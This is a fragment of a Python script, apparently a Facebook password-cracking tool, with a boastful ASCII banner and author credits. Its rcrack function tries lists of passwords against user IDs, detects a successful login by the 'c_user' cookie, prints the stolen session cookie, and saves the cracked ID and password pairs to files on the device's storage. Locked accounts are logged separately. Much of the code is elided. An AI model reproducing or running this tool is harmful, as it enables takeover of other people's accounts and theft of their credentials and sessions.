#Fuck SH1MANTO 
#Dec By SHIMANTO 
#SHIMANTO Your Reyal Pappa
#SHIMANTO Kids Numbar 5
...
██      ██ ██   ██ ██ ███████ ██   ██ ██ ██      ██ ██   ██ ██   ████    ██     ██████  
       ...
       ┌━━━━━━━━━━━━━━━━━ XA1KO-SH1MANTO 👿 ━━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  XA1KO-SH1MANTO 👿          
               \033[1;91mFACEBOK      :  SHIMANTO CHOWDHURY              
               \033[1;97mGITHUB       :  SHIMANTO-404-CYBER       
               \033[1;91mSTATUS       :   PREMIUM           
               \033[1;97mTEAM         :  NO                 
               \033[1;91mTOOL VIRSION :  0.1                  
               \033[1;97mTOOL WORK    :   DATA & WIFI          
      \033[1;32m └━━━━━━━━━━━━━━━━━ XA1KO-SH1MANTO 👿 ━━━━━━━━━━━━━━━━┘""")
loop = 0
oks = []
cps = []
def linex():
...
try:
    ...
    open('.prox.txt','w').write(prox)
	  ...
	  print('WELCOME TO SH1MANTO-CYBER-143 TOOLS🔥')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\r\033[1;37m[SH1MANTO\033[1;37m]  [%s/%s]  OK-%s'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                print('\r\r\033[38;5;46m[SH1MANTO-OK🔥] '+uid+ ' | ' +ps+ ' \n\033[1;37m[\033[38;5;46mCOOKIE🎁\033[38;5;196m=\033[1;37m] \033[38;5;46m'+coki+'')
                open('/sdcard/SH1MANTO-PAID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                #print('\r\r\033[1;31m[SH1MANTO-CP] '+uid+ ' | ' +ps+'')
                open('/sdcard/SH1MANTO-PAID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
